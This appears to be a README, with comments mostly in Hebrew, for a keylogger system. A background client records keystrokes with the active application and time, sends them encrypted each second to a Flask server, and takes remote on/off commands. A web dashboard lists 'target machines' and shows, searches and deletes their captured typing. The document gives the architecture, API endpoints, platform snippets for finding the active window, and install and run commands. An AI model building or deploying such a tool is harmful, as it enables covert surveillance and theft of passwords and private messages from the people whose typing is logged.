######################################################################
#                    Keylogger Management System                     #
######################################################################

# ========================== keylogger.py ============================
# Client-side agent:
# - מאזין ללחיצות מקלדת (pynput), מאגד תווים למילים (space/backspace).
# - משייך כל מילה לאפליקציה הפעילה ולחותמת זמן.
# - שומר לוגים מקומיים ושולח אותם מוצפנים לשרת (/api/upload) כל שנייה.
# - מבצע polling כל 2 שניות לשרת (/api/toggle) כדי להפעיל/לכבות.
# - רץ ברקע; ניתן לעצור עם Ctrl+C.

# ============================ app.py ================================
# Server-side (Flask):
# - מקבל נתונים מוצפנים, מפענח ושומר כ-JSON בתיקיות data ו-decrypted_data.
# - מספק API:
#   /api/upload              ← קליטת לוגים מוצפנים
#   /api/toggle              ← הפעלה/כיבוי לכל מכונה (GET/POST)
#   /api/getData/<machine>   ← החזרת לוגים למכונה ספציפית
#   /api/getTargetMachinesList ← רשימת מכונות זמינות
#   /api/deleteLogs/<machine> ← מחיקת לוגים
#   /api/addUser /api/deleteUser /api/validateUser ← ניהול משתמשים
# - אחסון: בתיקיות data ו-decrypted_data.

# ============================ Frontend ==============================
# HTML UI:
# - log_in.html           ← דף כניסה (הוספה/מחיקה/אימות משתמשים)
# - WebsiteView.html      ← רשימת מכונות + כפתור Log Out
# - individualUinit.html  ← ממשק למכונה: חיפוש, הצגה, מחיקה ורענון לוגים

# ========================= System Workflow ==========================
# Client שולח → Server מקבל ומפענח → Web מציג ומנהל
# מנוהל במקביל באמצעות threading (שליחה, polling, האזנה).

# ==================== macOS / Windows Support =======================
# בפונקציה get_active_application():
#
# --- Windows (מושבת כברירת מחדל, יש להסיר #) ---
# if platform.system() == "Windows":
#     import win32gui
#     hwnd = win32gui.GetForegroundWindow()
#     return win32gui.GetWindowText(hwnd) or "Unknown"
# דרוש: pip install pywin32
#
# --- macOS (פעיל כברירת מחדל) ---
# if platform.system() == "Darwin":
#     from AppKit import NSWorkspace
#     active_app = NSWorkspace.sharedWorkspace().activeApplication()
#     return active_app.get("NSApplicationName", "Unknown")
# דרוש: pip install pyobjc
#
# --- אחר ---
# מחזיר "Unsupported"

# ======================= Required Packages ==========================
pip install pynput requests cryptography flask   # כללי
pip install pyobjc                                # macOS בלבד
pip install pywin32                               # Windows (אם מפעילים Win32)

# ========================== Requirements ============================
# Python 3.6 ומעלה (נדרש עבור Fernet)

# ========================= How to Run ===============================
# צד השרת:
python app.py
# ברירת מחדל: http://127.0.0.1:5000

# צד הלקוח:
python keylogger.py
# macOS / Linux: אין צורך בשינויים
# Windows: יש להסיר # מהשורות של Windows, להרדים שורות macOS ולהתקין pywin32
######################################################################
